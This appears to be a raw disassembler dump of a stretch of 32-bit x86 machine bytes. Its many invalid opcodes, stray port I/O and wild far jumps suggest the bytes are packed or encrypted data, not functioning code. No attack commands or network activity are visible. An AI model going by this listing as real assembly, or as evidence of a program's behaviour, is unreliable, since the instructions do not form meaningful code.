  4479b1:	ins    BYTE PTR es:[edi],dx
  4479b2:	(bad)  
  4479b3:	ds repz pusha 
  4479b6:	jmp    0x4479f9
  4479b8:	mov    dh,BYTE PTR [esi-0x6b717f2]
  4479be:	xchg   DWORD PTR [ebx+0x3ec65222],ebp
  4479c4:	jecxz  0x447a06
  4479c6:	jmp    0x4479e9
  4479c8:	jmp    0x4479e1
  4479ca:	jmp    0x4577e8
	...
  4479e3:	add    BYTE PTR [eax],al
  4479e5:	add    BYTE PTR [eax-0x51f70697],bh
  4479eb:	add    bh,bh
  4479ed:	aad    0x2d
  4479ef:	jmp    0x4479f2
  4479f1:	ret    0x4178
  4479f4:	fld    QWORD PTR [edi+esi*4]
  4479f7:	daa    
  4479f8:	dec    ax
  4479fa:	icebp  
  4479fb:	push   es
  4479fc:	es jmp 0x447a4b
  4479ff:	out    dx,eax
  447a00:	loope  0x4479ff
  447a02:	sbb    eax,DWORD PTR [edi]
  447a04:	(bad)  
  447a06:	cld    
  447a07:	xchg   BYTE PTR [ebx+0x16],dl
  447a0a:	hlt    
  447a0b:	outs   dx,DWORD PTR ds:[esi]
  447a0c:	in     eax,dx
  447a0d:	sub    BYTE PTR [esi-0x1],0xe5
  447a11:	or     al,0x77
  447a13:	cdq    
  447a14:	out    0x3,al
  447a16:	hlt    
  447a17:	test   DWORD PTR [ebx],esi
  447a19:	push   cs
  447a1a:	clc    
  447a1b:	stc    
  447a1c:	pop    eax
  447a1d:	mov    ds:0xebe6eacb,al
  447a22:	popa   
  447a23:	jmp    0x4479be
  447a25:	std    
  447a26:	js     0x4479ae
  447a28:	adc    edx,DWORD PTR [esi]
  447a2a:	mov    bl,0x71
  447a2c:	in     eax,dx
  447a2d:	sub    BYTE PTR [esi],0xff
  447a30:	in     eax,0xc
  447a32:	ja     0x447aad
  447a34:	out    0x3,al
  447a36:	hlt    
  447a37:	test   edi,edi
  447a39:	repz add edx,ebp
  447a3c:	or     DWORD PTR [edi+0x76],ebx
  447a3f:	jmp    0x5efa:0x688fe9f8
  447a46:	jns    0x4479f1
  447a48:	jl     0x447a1e
	...
  447a62:	add    BYTE PTR [ecx],cl
  447a64:	jmp    0x447ad9
  447a66:	stc    
  447a67:	je     0x447ad8
  447a69:	push   es
  447a6a:	jmp    0x4f7:0xe96b85f0
  447a71:	call   0xf931cc3b
  447a76:	sub    dh,BYTE PTR [ebp+0x6f]
  447a79:	adc    ch,dl
  447a7b:	retf   0x7cf8
  447a7e:	pushf  
  447a7f:	in     eax,dx
  447a80:	out    0x73,eax
  447a82:	mov    bl,0x1f
  447a84:	push   eax
  447a85:	cli    
  447a86:	push   cs
  447a87:	sub    DWORD PTR [ecx+0x109847c],ebp
  447a8d:	jae    0x447a7c
  447a8f:	je     0x447b00
  447a91:	push   es
  447a92:	jmp    0xed09:0xa1e83c8a
  447a99:	clc    
  447a9a:	stos   BYTE PTR es:[edi],al
  447a9b:	je     0x447b0c
  447a9d:	adc    ah,ah
  447a9f:	add    BYTE PTR [esi],0xe8
  447aa2:	adc    eax,0xaaf8ecf2
  447aa7:	je     0x447b17
  447aa9:	adc    ch,bh
  447aab:	push   0xfffffff9
  447aad:	jl     0x447aeb
  447aaf:	out    dx,al
  447ab0:	out    0x73,eax
  447ab2:	add    esp,eax
  447ab4:	pop    ds
  447ab5:	cli    
  447ab6:	scas   al,BYTE PTR es:[edi]
  447ab7:	enter  0x7ca8,0x24
  447abb:	jmp    0x66e:0x74ff7303
  447ac2:	jmp    0x0:0xc7d0d2a
	...
  447add:	add    BYTE PTR [eax],al
  447adf:	add    ch,ah
  447ae1:	inc    esp
  447ae2:	jae    0x447ae4
  447ae4:	test   eax,0x8d0e7584
  447ae9:	jno    0x447af7
  447aeb:	call   0x3c6289
  447af0:	pop    esi
  447af1:	(bad)  
  447af3:	std    
  447af4:	sbb    ch,cl
  447af6:	mov    ebx,0xf90b508b
  447afb:	inc    esp
  447afc:	inc    BYTE PTR [ebx-0x3ba0dcc3]
  447b02:	loopne 0x447af2
  447b04:	mov    bh,0xe8
  447b06:	imul   eax
  447b08:	pop    edi
  447b09:	in     al,dx
  447b0a:	idiv   edi
  447b0c:	fisubr WORD PTR [edx+0xe]
  447b0f:	add    al,0x98
  447b11:	jmp    edi
  447b13:	in     eax,0x18
  447b15:	jmp    0x430b3f11
  447b1a:	adc    al,BYTE PTR [ecx]
  447b1c:	pusha  
  447b1d:	and    al,0x7b
  447b1f:	inc    ebp
  447b20:	ds add al,0xbb
  447b23:	call   0x3c6710
  447b28:	add    eax,0xafff317
  447b2d:	imul   esi,DWORD PTR [esi+0x16],0xe7fe721d
  447b34:	push   ecx
  447b35:	jmp    0x447b2e
  447b37:	dec    DWORD PTR [esi-0x7f]
  447b3a:	jne    0x447b52
  447b3c:	fbstp  TBYTE PTR [ebp-0x2]
  447b3f:	out    0x85,eax
  447b41:	out    dx,al
  447b42:	idiv   edi
	...
  447b5c:	add    BYTE PTR [esi-0x31e98a80],cl
  447b62:	jne    0x447b62
  447b64:	out    0x79,eax
  447b66:	out    dx,al
  447b67:	idiv   edi
  447b69:	sahf   
  447b6a:	xor    BYTE PTR [ebp+0x16],0xd1
  447b6e:	jne    0x447b6e
  447b70:	out    0x2d,eax
  447b72:	out    dx,al
  447b73:	idiv   edi
  447b75:	hlt    
  447b76:	call   0x26f:0xe1027a80
  447b7d:	mov    WORD PTR [edx-0x9],cs
  447b80:	clc    
  447b81:	fwait
  447b82:	fwait
  447b83:	cmp    BYTE PTR [edx-0x16],0xd6
  447b87:	jbe    0x447b8b
  447b89:	pushf  
  447b8a:	idiv   ax
  447b8d:	sbb    DWORD PTR [ebx],0xffffff89
  447b90:	inc    edx
  447b91:	(bad)  
  447b93:	aas    
  447b94:	sbb    eax,0xfe219977
  447b99:	ss inc esi
  447b9b:	mov    ebx,0x813f63f5
  447ba0:	jp     0x447ba4
  447ba2:	fisubr WORD PTR [edi+0x2]
  447ba5:	pop    esp
  447ba6:	ret    0xf8f7
  447ba9:	dec    ebx
  447baa:	sbb    eax,DWORD PTR [ecx+0x6fdcea7a]
  447bb0:	add    cl,BYTE PTR [esi+edi*2-0x9]
  447bb4:	clc    
  447bb5:	xor    ebx,DWORD PTR [ebx]
  447bb7:	cmp    DWORD PTR [edx+0x2],0xc0f6fdc
  447bbe:	mov    cl,0xfa
  447bc0:	clc    
	...
  447bd9:	add    BYTE PTR [ebx],bl
  447bdb:	pop    ebx
  447bdc:	ja     0x447be4
  447bde:	imul   DWORD PTR [ecx+0x53]
  447be1:	call   0xf93a54a3
  447be6:	aaa    
  447be7:	pop    ebx
  447be8:	js     0x447bfc
  447bea:	not    DWORD PTR [eax-0x2]
  447bed:	out    0x31,eax
  447bef:	shl    ebp,1
  447bf1:	clc    
  447bf2:	mov    bh,0x5a
  447bf4:	js     0x447c08
  447bf6:	clc    
  447bf7:	sub    BYTE PTR [ebx],dl
  447bf9:	call   0xf93a400c
  447bfe:	ja     0x447c30
  447c00:	or     bh,ch
  447c02:	inc    edi
  447c03:	out    0xe4,eax
  447c05:	and    ecx,eax
  447c07:	add    al,0xa2
  447c09:	cli    
  447c0a:	js     0x447b8f
  447c0c:	sbb    edx,DWORD PTR [edx]
  447c0e:	div    DWORD PTR [ecx-0x17]
  447c11:	jmp    0x447c14
  447c13:	jmp    0x1203:0x8360fa89
  447c1a:	div    BYTE PTR [ecx-0x28]
  447c1d:	jmp    0x447c13
  447c1f:	jmp    0x6dd:0x6a08fa71
  447c26:	or     cl,bh
  447c28:	dec    esi
  447c29:	push   es
  447c2a:	jg     0x447c13
  447c2c:	pop    ecx
  447c2d:	(bad)  
  447c2e:	pop    ebx
  447c2f:	jmp    0xc3b17686
  447c34:	pop    ebp
  447c35:	inc    eax
  447c36:	or     al,BYTE PTR [esi]
  447c38:	lods   al,BYTE PTR ds:[esi]
  447c39:	fld    DWORD PTR es:[ecx+0x6]
  447c3d:	pop    es
	...
  447c56:	add    BYTE PTR [ecx+0x4cfe00dc],dl
  447c5c:	out    0x65,eax
  447c5e:	js     0x447c46
  447c60:	add    al,0x9c
  447c62:	add    DWORD PTR [ebp+eiz*8+0x1a],ecx
  447c66:	cli    
  447c67:	sub    al,0xc3
  447c69:	gs js  0x447c72
  447c6c:	push   es
  447c6d:	xchg   esp,eax
  447c6e:	add    DWORD PTR [ecx+edx*8],ecx
  447c71:	add    bh,dl
  447c73:	sbb    al,0xc3
  447c75:	gs js  0x447c5e
  447c78:	add    bh,BYTE PTR [esp+edx*1+0x1c]
  447c7c:	ret    0xf9ef
  447c7f:	cld    
  447c80:	and    BYTE PTR [ebx+0xe],0xf9
  447c84:	jb     0x447cbb
  447c86:	in     al,dx
  447c87:	lods   eax,DWORD PTR ds:[esi]
  447c88:	jmp    0x82ed765e
  447c8d:	dec    ebx
  447c8e:	adc    ah,cl
  447c90:	jno    0x447c7b
  447c92:	jmp    0x447c1d
  447c94:	jmp    0x82d57652
  447c99:	push   DWORD PTR [ebx]
  447c9b:	out    0x0,al
  447c9d:	jae    0x447c77
  447c9f:	iret   
  447ca0:	(bad)  
  447ca1:	mul    BYTE PTR [esi-0xc849643]
  447ca7:	clc    
  447ca8:	jo     0x447cd3
  447caa:	or     DWORD PTR [ecx-0x46710716],0x9adf7b69
  447cb4:	jae    0x447cb8
  447cb6:	xchg   ecx,eax
  447cb7:	jge    0x447ca3
  447cb9:	clc    
  447cba:	jbe    0x447cbc
	...
  447cd4:	mov    cl,0x69
  447cd6:	jnp    0x447caf
  447cd8:	cmc    
  447cd9:	jno    0x447cea
  447cdb:	push   ecx
  447cdc:	cld    
  447cdd:	in     eax,dx
  447cde:	clc    
  447cdf:	pop    esi
  447ce0:	jns    0x447d4d
  447ce2:	push   es
  447ce3:	jmp    0xed6b:0xd1e7f8db
  447cea:	clc    
  447ceb:	sub    cl,BYTE PTR [eax+0x58]
  447cee:	cld    
  447cef:	ds dec ebp
  447cf1:	test   eax,0xe5e9ac84
  447cf6:	inc    ebx
  447cf7:	or     bh,BYTE PTR [ecx+0x43]
  447cfa:	sbb    eax,0x9cde30ea
  447cff:	and    BYTE PTR ds:0x5947ced,ch
  447d05:	add    eax,0x540fe773
  447d0a:	cld    
  447d0b:	push   es
  447d0c:	sbb    eax,0xe57c7ca9
  447d11:	in     eax,0x73
  447d13:	out    dx,eax
  447d14:	pop    ds
  447d15:	inc    eax
  447d16:	cld    
  447d17:	out    dx,al
  447d18:	cld    
  447d19:	test   al,0x7c
  447d1b:	fs out 0xe6,al
  447d1e:	jae    0x447d14
  447d20:	fbstp  TBYTE PTR [edi+esi*8]
  447d23:	(bad)  
  447d24:	in     al,dx
  447d25:	push   0xfbf8e37b
  447d2a:	add    DWORD PTR [eax],0x36
  447d2d:	add    DWORD PTR [eax],eax
  447d2f:	add    BYTE PTR [ebp-0x7d0003e4],ah
  447d35:	sar    BYTE PTR [ebx+0x7d],0x0
	...
  447d51:	stos   DWORD PTR es:[edi],eax
  447d52:	add    BYTE PTR [ebp+0x1d],ch
  447d55:	dec    esi
  447d56:	outs   dx,DWORD PTR ds:[esi]
  447d57:	cli    
  447d58:	invd   
  447d5a:	adc    ch,al
  447d5c:	push   ss
  447d5d:	test   ah,ch
  447d5f:	test   DWORD PTR [ebx+0x73faf6f0],0xfc0ad8d3
  447d69:	adc    ch,ch
  447d6b:	mov    ebx,0xf7ed91e8
  447d70:	dec    DWORD PTR [esi-0x80]
  447d73:	jne    0x447d8b
  447d75:	mov    DWORD PTR [esi-0x2],edx
  447d78:	out    0x5d,eax
  447d7a:	in     eax,dx
  447d7b:	idiv   edi
  447d7d:	push   ds
  447d7e:	xor    DWORD PTR [ebp+0x16],0xe7fe5658
  447d85:	sbb    ecx,ebp
  447d87:	idiv   edi
  447d89:	push   ds
  447d8a:	xor    DWORD PTR [ebp+0x16],0xe809565b
  447d91:	lods   al,BYTE PTR ds:[esi]
  447d92:	jmp    0x6f137d8e
  447d97:	add    al,BYTE PTR [ebx]
  447d99:	mov    DWORD PTR [edx],ebx
  447d9b:	call   0xf831847d
  447da0:	ret    
  447da1:	mov    gs,WORD PTR [esi+0xe]
  447da4:	pop    es
  447da5:	cwde   
  447da6:	adc    al,0x7b
  447da8:	jge    0x447dc9
  447daa:	adc    DWORD PTR [ebp+0x11],ebp
  447dad:	cmc    
  447dae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  447daf:	lock call DWORD PTR [edx]
  447db2:	xor    DWORD PTR [ebp+0xa],0x0
	...
  447dcd:	add    BYTE PTR [esi],cl
  447dcf:	push   ebp
  447dd0:	or     al,0xe8
  447dd2:	popf   
  447dd3:	loopne 0x447dcc
  447dd5:	push   esp
  447dd7:	scas   al,BYTE PTR es:[edi]
  447dd8:	jmp    0x447d8f
  447dda:	(bad)  
  447ddc:	lock mov esp,0xff16316f
  447de2:	cmp    BYTE PTR [edi],cl
  447de4:	jge    0x447e28
  447de6:	pop    ss
  447de7:	out    dx,eax
  447de8:	mov    ebp,0xf096cfe7
  447ded:	clc    
  447dee:	ja     0x447e19
  447df0:	or     al,BYTE PTR [eax]
  447df2:	sub    ecx,ebx
  447df4:	in     al,0x90
  447df6:	lods   al,BYTE PTR ds:[esi]
  447df7:	jnp    0x447de9
  447df9:	jl     0x447e1c
  447dfb:	call   0x4eb586fd
  447e00:	add    al,0x0
  447e02:	hlt    
  447e03:	jne    0x447d85
  447e05:	hlt    
  447e06:	mov    ebx,DWORD PTR [ebx-0x43]
  447e09:	jl     0x447e0c
  447e0b:	mov    esp,0x35e17303
  447e10:	js     0x447e0a
  447e12:	jae    0x447e57
  447e14:	jge    0x447e90
  447e16:	(bad)  
  447e17:	out    dx,al
  447e18:	add    DWORD PTR [ebx-0x31187],eax
  447e1e:	dec    esp
  447e1f:	mov    ds:0x2f53f8f5,al
  447e24:	jge    0x447ea0
  447e26:	loop   0x447e17
  447e28:	outs   dx,DWORD PTR ds:[esi]
  447e29:	adc    ecx,DWORD PTR [ebp+ecx*8-0xc]
  447e2d:	clc    
  447e2e:	cmp    ebp,DWORD PTR [edi+0x77]
  447e31:	push   es
	...
  447e4a:	add    bh,dh
  447e4c:	bnd jg 0x447eb4
  447e4f:	hlt    
  447e50:	in     eax,dx
  447e51:	cld    
  447e52:	out    0xbd,eax
  447e54:	div    al
  447e56:	clc    
  447e57:	aaa    
  447e58:	outs   dx,DWORD PTR ds:[esi]
  447e59:	ja     0x447e6d
  447e5b:	neg    DWORD PTR [eax+0x14]
  447e5e:	call   0xf9365415
  447e63:	ja     0x447ed6
  447e65:	pop    es
  447e66:	std    
  447e67:	add    BYTE PTR [esi+esi*1],0xec
  447e6b:	xor    eax,esp
  447e6d:	fdecstp 
  447e6f:	test   al,0x87
  447e71:	push   ebx
  447e72:	push   cs
  447e73:	clc    
  447e74:	pop    ecx
  447e75:	loope  0x447e62
  447e77:	and    eax,0x90f6c1e0
  447e7c:	xchg   DWORD PTR [ebx],edi
  447e7e:	push   cs
  447e7f:	neg    DWORD PTR [ecx-0x28]
  447e82:	jmp    0x447e64
  447e84:	fsubr  QWORD PTR [ecx-0x129dc70a]
  447e8a:	add    ah,BYTE PTR [edi]
  447e8c:	adc    eax,0xe3a1168f
  447e91:	xchg   ecx,eax
  447e92:	ret    0x6220
  447e95:	icebp  
  447e96:	std    
  447e97:	test   BYTE PTR es:[esi+0x79e38c07],0x82
  447e9f:	push   cs
  447ea0:	(bad)  
  447ea2:	jo     0x447e8f
  447ea4:	in     al,dx
  447ea5:	fdivp  st(2),st
  447ea7:	jl     0x447e8c
  447ea9:	and    eax,0xe1faee82
  447eae:	jbe    0x447eb0
	...
  447ec8:	cmc    
  447ec9:	in     al,dx
  447eca:	pop    ebx
  447ecb:	out    dx,al
  447ecc:	pop    esp
  447ecd:	jecxz  0x447f0c
  447ecf:	std    
  447ed0:	push   ebx
  447ed1:	fnstcw WORD PTR [esi+esi*8]
  447ed4:	dec    esp
  447ed5:	(bad)  
  447ed6:	ins    DWORD PTR es:[edi],dx
  447ed7:	inc    eax
  447ed8:	loop   0x447edf
  447eda:	lods   al,BYTE PTR ds:[esi]
  447edb:	and    al,cl
  447edd:	dec    ecx
  447ede:	push   es
  447edf:	add    bh,BYTE PTR [ecx-0x14]
  447ee2:	enter  0x2cfb,0xe3
  447ee6:	gs js  0x447eef
  447ee9:	add    eax,0xb60c149c
  447eee:	adc    esi,esi
  447ef0:	sbb    al,0x87
  447ef2:	or     DWORD PTR [ecx],0x11
  447ef5:	pop    eax
  447ef6:	cwde   
  447ef7:	jmp    0x447f36
  447ef9:	fdivp  st(7),st
  447efb:	cmc    
  447efc:	or     DWORD PTR [eax-0x1c169384],esp
  447f02:	jae    0x447efc
  447f04:	fistp  WORD PTR [ecx+0x61e1def0]
  447f0a:	jnp    0x447eef
  447f0c:	hlt    
  447f0d:	push   ebp
  447f0e:	ror    DWORD PTR ss:[ecx-0x4a390728],0x61
  447f16:	jnp    0x447eef
  447f18:	cmc    
  447f19:	push   ebp
  447f1a:	xadd   DWORD PTR [ebp+edx*8+0x5f75aef8],edx
  447f22:	push   es
  447f23:	jmp    0xddae:0x49e80022
  447f2a:	clc    
  447f2b:	stos   BYTE PTR es:[edi],al
	...
  447f44:	add    BYTE PTR [ebp+0x5f],dh
  447f47:	adc    ch,dl
  447f49:	or     dl,BYTE PTR [edx]
  447f4b:	call   0xf92220c4
  447f50:	push   0x3
  447f52:	or     edi,ebp
  447f54:	sti    
  447f55:	sti    
  447f56:	in     al,dx
  447f57:	xchg   BYTE PTR [ebx-0x7f],dh
  447f5a:	fnstsw WORD PTR [ecx+edx*2+0x5ef8d875]
  447f61:	xor    eax,0xf6f34289
  447f66:	inc    ebp
  447f67:	sbb    eax,0xfe001b6a
  447f6c:	sub    DWORD PTR [ecx+0x47],ecx
  447f6f:	sbb    eax,0x8e30b26
  447f74:	jmp    0xa53e8470
  447f79:	adc    eax,0xf8cb7a85
  447f7e:	push   ebp
  447f7f:	add    dl,BYTE PTR [ecx]
  447f81:	rcr    edx,0xf8
  447f84:	push   ss
  447f85:	xor    eax,0xf0ca4289
  447f8a:	xchg   esi,eax
  447f8b:	pop    es
  447f8c:	add    BYTE PTR [eax+0x1d038604],cl
  447f92:	test   DWORD PTR [eax-0x4049f5fc],edi
  447f98:	inc    ebp
  447f99:	(bad)  
  447f9b:	add    BYTE PTR [eax],al
  447f9d:	ffree  st(4)
  447f9f:	test   DWORD PTR [ebp-0x2],0x4d223dda
  447fa6:	pop    ebx
  447fa7:	sbb    cl,BYTE PTR [edi]
	...
  447fc1:	add    BYTE PTR [eax-0x1d],al
  447fc4:	loopne 0x447ffb
  447fc6:	mov    bh,0xd8
  447fc8:	test   ebx,0xd0fe4b46
  447fce:	mov    ah,0x8e
  447fd0:	push   ebp
  447fd1:	push   es
  447fd2:	push   esi
  447fd3:	and    ebx,DWORD PTR [ebx]
  447fd5:	rcpps  xmm1,XMMWORD PTR [esi]
  447fd8:	test   DWORD PTR [ebx+ebx*1],eax
  447fdb:	add    eax,0xe14d8300
  447fe0:	not    eax
  447fe2:	push   ss
  447fe3:	cmp    edi,esi
  447fe5:	sar    BYTE PTR [esi+ecx*4+0x45],1
  447fe9:	push   es
  447fea:	pop    esi
  447feb:	fdivr  DWORD PTR ds:0x1a230b23
  447ff1:	or     BYTE PTR [eax+0x63750723],0xed
  447ff8:	cli    
  447ff9:	stc    
  447ffa:	retf   0xbbd8
  447ffd:	mov    edx,DWORD PTR [eax+0x4db60724]
  448003:	sbb    DWORD PTR [esp+esi*2+0x749f192f],esp
  44800a:	pop    ebx
  44800b:	sbb    DWORD PTR [esi-0x58e6a88c],esp
  448011:	je     0x448066
  448013:	sbb    DWORD PTR [edi],eax
  448015:	je     0x448036
  448017:	in     al,dx
  448018:	cld    
  448019:	lds    edx,FWORD PTR [eax+0x5]
  44801c:	stc    
  44801d:	mov    dh,ah
  44801f:	mov    al,0x1f
  448021:	or     DWORD PTR [edx-0x1d],esp
  448024:	add    DWORD PTR [ebx],0x0
	...
  44803e:	add    BYTE PTR [edx+0x347cfcee],al
  448044:	out    0xf3,eax
  448046:	iret   
  448047:	cmp    dh,BYTE PTR [eax-0xdc80004]
  44804d:	cmp    bl,BYTE PTR ds:0x802231f2
  448053:	imul   ecx,DWORD PTR [edi*8-0x573a058e],0xc0cfdbf6
  44805e:	test   BYTE PTR [ecx],bh
  448060:	or     edi,ebp
  448062:	mov    cl,0xf4
  448064:	loope  0x447ff2
  448066:	jae    0x44806a
  448068:	fisub  DWORD PTR [eax-0x580e018d]
  44806e:	jae    0x44805a
  448070:	jmp    0xc22af41b
  448075:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  448076:	jae    0x44804a
  448078:	mov    ecx,0xd1ce739a
  44807d:	cdq    
  44807e:	jae    0x44805a
  448080:	leave  
  448081:	cwde   
  448082:	jae    0x44805a
  448084:	mov    eax,ds:0x99e2739f
  448089:	sahf   
  44808a:	jae    0x44806a
  44808c:	mov    cl,0x9d
  44808e:	jae    0x44809a
  448090:	sub    ah,BYTE PTR [eax+0x74]
  448093:	push   es
  448094:	add    bl,BYTE PTR [edi+0x74]
  448097:	repnz stc 
  448099:	pop    ebp
  44809a:	je     0x44808a
  44809c:	adc    DWORD PTR [ebp+0x74],ebx
  44809f:	cli    
  4480a0:	or     ebp,edi
  4480a2:	jae    0x4480a4
	...
  4480bc:	div    BYTE PTR [edx]
  4480be:	or     dl,al
  4480c0:	mov    ecx,0xb18503ec
  4480c5:	or     bh,ch
  4480c7:	mov    cl,0xfc
  4480c9:	add    al,0x74
  4480cb:	or     BYTE PTR [esi+0x4],bh
  4480ce:	out    0x86,eax
  4480d0:	arpl   WORD PTR [ecx],cx
  4480d2:	adc    dl,ah
  4480d4:	xor    eax,0x5103e84a
  4480d9:	loopne 0x448086
  4480db:	es push cs
  4480dd:	dec    edx
  4480de:	lds    eax,FWORD PTR [ebx+0x78e2227e]
  4480e4:	imul   ah
  4480e6:	sahf   
  4480e7:	in     al,dx
  4480e8:	in     al,dx
  4480e9:	fbld   TBYTE PTR [ebp-0x15dbc982]
  4480ef:	mov    ecx,0x816a91fb
  4480f4:	fild   DWORD PTR [ebx]
  4480f6:	out    0x3,eax
  4480f8:	rcr    edi,1
  4480fa:	gs ret 
  4480fc:	neg    edi
  4480fe:	xchg   esi,eax
  4480ff:	(bad)  
  448100:	mov    esp,0x36f20649
  448105:	and    esp,DWORD PTR [edi+0x70]
  448108:	adc    dl,BYTE PTR [eax]
  44810a:	sbb    al,0xa
  44810c:	pushf  
  44810d:	and    eax,0xc39cf2a0
  448112:	pop    ebp
  448113:	dec    eax
  448114:	stc    
  448115:	sqrtps xmm7,xmm3
  448118:	jle    0x4480a2
  44811a:	jo     0x44811f
  44811c:	cld    
  44811d:	add    al,0xe7
  44811f:	push   es
	...
  448138:	add    ah,dh
  44813a:	and    DWORD PTR [esi-0x5a4b82f9],0xfffffff2
  448141:	mov    dh,0x23
  448143:	popa   
  448144:	dec    eax
  448145:	or     al,BYTE PTR [ebp+0x59ed25db]
  44814b:	jmp    0x4a20e32b
  448150:	repnz nop
  448152:	mov    ebp,DWORD PTR [ebx-0x116902da]
  448158:	xor    BYTE PTR [edi-0x72],0xff
  44815c:	call   0xeb3d609c
  448161:	mul    DWORD PTR [ecx-0x40]
  448164:	in     eax,dx
  448165:	es iret 
  448167:	mov    esp,0xfff6ac26
  44816c:	call   0xa4c98668
  448171:	fimul  DWORD PTR ds:0x1bf0a9b2
  448177:	mov    ecx,0x7904f7e9
  44817c:	fcomp  DWORD PTR [edi]
  44817e:	or     esi,edx
  448180:	out    dx,al
  448181:	in     eax,0x61
  448183:	jnp    0x448184
  448185:	cld    
  448186:	pop    edx
  448187:	add    dl,cl
  448189:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44818a:	(bad)  
  44818b:	clc    
  44818c:	(bad)  
  44818d:	mov    cl,0xe6
  44818f:	lods   eax,DWORD PTR ds:[esi]
  448190:	aam    0xc5
  448192:	fld    QWORD PTR [esp+ebp*1+0xa43ddfa]
  448199:	jns    0x4481de
  44819b:	sbb    eax,0xeb
	...
  4481b4:	add    BYTE PTR [eax],al
  4481b6:	mov    al,0xc5
  4481b8:	inc    edx
  4481b9:	shl    edi,cl
  4481bb:	add    al,0x0
  4481bd:	jmp    0xee61c4ea
  4481c2:	pop    ebp
  4481c3:	push   ds
  4481c4:	call   ebx
  4481c6:	fs fdivp st(0),st
  4481c9:	jmp    0xa02c75d2
  4481ce:	sbb    ebp,0xfffffff8
  4481d1:	push   0x13
  4481d3:	repz (bad) 
  4481d5:	sti    
  4481d6:	push   ds
  4481d7:	pusha  
  4481d8:	jnp    0x4481b1
  4481da:	cld    
  4481db:	pop    edx
  4481dc:	pop    ebp
  4481dd:	push   ecx
  4481de:	jno    0x4481b6
  4481e0:	clc    
  4481e1:	pop    esi
  4481e2:	cmp    DWORD PTR [ebx],ebx
  4481e4:	shr    cl,0xf7
  4481e7:	add    al,0x7c
  4481e9:	mov    bh,0xce
  4481eb:	lahf   
  4481ec:	mov    esi,0x810ca700
  4481f1:	ror    esi,0xe1
  4481f4:	pop    es
  4481f5:	add    DWORD PTR [edi],0xffffffde
  4481f8:	ins    DWORD PTR es:[edi],dx
  4481f9:	or     ebx,DWORD PTR [esi+0x5f73f8e9]
  4481ff:	mov    edx,0xd402f85a
  448204:	mov    ebx,0x6d030783
  448209:	aaa    
  44820a:	sahf   
  44820b:	jmp    0xba5ff70a
  448210:	dec    edx
  448211:	clc    
  448212:	add    dl,ch
  448214:	mov    ebx,0x6d090483
  448219:	push   es
	...
  448232:	add    ch,dh
  448234:	dec    ebx
  448235:	clc    
  448236:	call   edx
  448238:	enter  0xf97b,0xdb
  44823c:	push   esi
  44823d:	(bad)  
  44823e:	out    0x1,eax
  448240:	icebp  
  448241:	idiv   edi
  448243:	sahf   
  448244:	mov    cl,dh
  448246:	pop    es
  448247:	or     BYTE PTR [ebx],cl
  448249:	call   0xf819377f
  44824e:	ret    
  44824f:	dec    esi
  448250:	jmp    0x448259
  448252:	jne    0x4481ef
  448254:	mov    ecx,0xd452f81e
  448259:	mov    ebx,0xf7d5f4e8
  44825e:	call   DWORD PTR [esi]
  448260:	inc    edi
  448261:	adc    al,BYTE PTR [ecx]
  448263:	fsub   DWORD PTR [edi]
  448265:	jnp    0x4482ac
  448267:	mov    esi,0xd8c7bb07
  44826c:	push   cs
  44826d:	add    BYTE PTR [eax],al
  44826f:	lea    eax,[ecx]
  448271:	add    DWORD PTR [ebp+0x3e],0x4
  448275:	scas   al,BYTE PTR es:[edi]
  448276:	inc    eax
  448277:	pop    esp
  448278:	cs mov bh,0x0
  44827b:	dec    ebp
  44827c:	add    DWORD PTR [edi+0x11],esi
  44827f:	hlt    
  448280:	inc    ebx
  448281:	sub    dh,bl
  448283:	push   ebx
  448284:	dec    esi
  448285:	test   BYTE PTR [edx-0x1e],bh
  448288:	out    dx,al
  448289:	outs   dx,BYTE PTR ds:[esi]
  44828a:	cs dec esp
  44828c:	sbb    edi,eax
  44828e:	clc    
  44828f:	cmp    ebp,DWORD PTR [edx]
  448291:	sub    al,al
  448293:	hlt    
  448294:	jmp    0x448292
  448296:	jnp    0x448298
	...
  4482b0:	rcl    DWORD PTR [ebx+eax*8-0x42],1
  4482b4:	push   cs
  4482b5:	out    0x75,eax
  4482b7:	mov    esi,0x7d000c77
  4482bc:	push   cs
  4482bd:	mov    ebp,0x4770571
  4482c2:	div    BYTE PTR [ebx-0x1b]
  4482c5:	repz mov edi,0xbcd5fbf0
  4482cb:	jl     0x4482bb
  4482cd:	mov    ebx,0xaadc0271
  4482d2:	lock clc 
  4482d4:	jecxz  0x448285
  4482d6:	(bad)  [eax-0x7b174c20]
  4482dc:	cmp    eax,ebx
  4482de:	add    eax,DWORD PTR [ebx+0x17]
  4482e1:	outs   dx,DWORD PTR ds:[esi]
  4482e2:	inc    edi
  4482e3:	sbb    eax,0x42c0aef6
  4482e8:	fsubp  st(5),st
  4482ea:	cld    
  4482eb:	push   esp
  4482ed:	inc    di
  4482ef:	sbb    eax,0xff443bfb
  4482f4:	loopne 0x448330
  4482f6:	add    al,0x0
  4482f8:	hlt    
  4482f9:	repnz or al,ch
  4482fc:	scas   eax,DWORD PTR es:[edi]
  4482fd:	jb     0x4482e7
  4482ff:	clc    
  448300:	ja     0x448303
  448302:	adc    al,BYTE PTR [eax+ecx*1]
  448305:	in     al,dx
  448306:	jge    0x448382
  448308:	loop   0x4482f5
  44830a:	jo     0x448314
  44830c:	ja     0x4482f7
  44830e:	adc    al,BYTE PTR [ecx]
  448310:	jmp    0x448316
  448312:	in     eax,0xda
	...
  44832c:	add    BYTE PTR [edx],ah
  44832e:	in     eax,dx
  44832f:	neg    WORD PTR [esp+ebx*8+0x25]
  448334:	xor    DWORD PTR [eax*1+0x10c803e7],esi
  44833b:	jo     0x4482ff
  44833d:	sub    bh,0xe2
  448340:	jl     0x4483bc
  448342:	mov    BYTE PTR [edi-0x1],al
  448345:	mov    al,0xde
  448347:	fdivr  DWORD PTR [eax+0x7]
  44834a:	mov    BYTE PTR [edi],bl
  44834c:	cld    
  44834d:	sahf   
  44834e:	and    al,0x66
  448350:	in     eax,dx
  448351:	sbb    BYTE PTR [eax-0x12],bl
  448354:	or     BYTE PTR [edx],0x7
  448357:	xchg   ebx,eax
  448358:	adc    eax,0xeefa321c
  44835d:	cld    
  44835e:	(bad)  
  44835f:	gs jmp 0xcea:0x82de51ec
  448367:	imul   eax,DWORD PTR ds:0xeeda41dc,0xffffffdc
  44836e:	(bad)  
  44836f:	into   
  448370:	sub    esp,eax
  448372:	fcmovnbe st,st(1)
  448374:	jp     0x4483ac
  448376:	jmp    edi
